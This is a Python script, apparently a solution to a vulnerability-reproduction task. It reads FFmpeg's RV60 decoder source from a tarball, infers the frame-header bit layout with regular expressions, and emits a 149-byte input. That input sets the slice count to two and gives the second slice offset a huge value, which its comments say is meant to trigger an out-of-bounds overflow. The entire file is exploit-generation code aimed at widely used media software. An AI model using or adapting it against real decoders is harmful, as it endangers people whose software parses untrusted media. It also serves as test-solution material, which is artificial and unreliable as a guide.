import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        c_code = ""
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('libavcodec/rv60dec.c'):
                        f = tar.extractfile(member)
                        if f:
                            c_code = f.read().decode('utf-8', errors='ignore')
                        break
        except Exception:
            return b'\x00' * 149
        
        if not c_code:
            return b'\x00' * 149

        # Locate rv60_decode_frame body
        idx = c_code.find("int rv60_decode_frame")
        if idx == -1:
            idx = c_code.find("rv60_decode_frame")
        
        if idx != -1:
            body_start = c_code.find("{", idx)
            if body_start != -1:
                # Capture a large chunk for analysis
                code_chunk = c_code[body_start:body_start+4000]
            else:
                code_chunk = c_code
        else:
            code_chunk = c_code

        # Regex to capture get_bits calls, identifying variable assignment, function, and bit count
        pattern = re.compile(r'(?:(\w+)\s*=\s*)?(get_bits_long|get_bits|get_bits1|get_ue_golomb)\s*\(\s*&?\w+(?:,\s*(\d+))?\s*\)')
        
        matches = list(pattern.finditer(code_chunk))
        
        bits = []
        found_slice = False
        slice_bits_len = 8
        offset_bits_len = 32
        
        for m in matches:
            var = m.group(1)
            func = m.group(2)
            arg = m.group(3)
            
            n = 0
            val_to_write = 0
            
            if func == 'get_bits1':
                n = 1
                val_to_write = 0
            elif func == 'get_ue_golomb':
                # ue(0) maps to bit '1'
                bits.append(1)
                continue
            else:
                n = int(arg) if arg else 0
                val_to_write = 0
            
            # Check if this is the slice count read
            is_slice = False
            if var and ('slice' in var) and ('num' in var or 'cnt' in var or 'count' in var or var == 'slices'):
                is_slice = True
            
            if is_slice:
                found_slice = True
                slice_bits_len = n
                # Set slice count to 2 to enable loop and second offset
                val_to_write = 2
                
                # Heuristic: Look ahead for offset bit width
                rest = code_chunk[m.end():]
                off_m = pattern.search(rest)
                if off_m:
                    func_next = off_m.group(2)
                    arg_next = off_m.group(3)
                    if func_next != 'get_ue_golomb' and arg_next:
                        offset_bits_len = int(arg_next)
                
                # Write slice count
                for i in range(n-1, -1, -1):
                    bits.append((val_to_write >> i) & 1)
                
                break # Stop processing header, proceed to offsets
            else:
                # Write default (0) for other header fields
                for i in range(n-1, -1, -1):
                    bits.append((val_to_write >> i) & 1)
        
        if found_slice:
            # Write Offset 0: value 0
            for i in range(offset_bits_len-1, -1, -1):
                bits.append(0)
            
            # Write Offset 1: Large value to trigger overflow/OOB
            # Use a large value that fits in offset_bits_len
            # e.g., if 32 bits, 0x1FFFFFFF is large enough to exceed 149 byte buffer
            large = (1 << (min(offset_bits_len, 30))) - 1
            for i in range(offset_bits_len-1, -1, -1):
                bits.append((large >> i) & 1)
        
        # Convert bits to bytes
        byte_arr = bytearray()
        cur = 0
        cnt = 0
        for b in bits:
            cur = (cur << 1) | b
            cnt += 1
            if cnt == 8:
                byte_arr.append(cur)
                cur = 0
                cnt = 0
        if cnt > 0:
            byte_arr.append(cur << (8 - cnt))
            
        res = bytes(byte_arr)
        
        # Pad to 149 bytes
        if len(res) < 149:
            res += b'\x00' * (149 - len(res))
        
        return res[:149]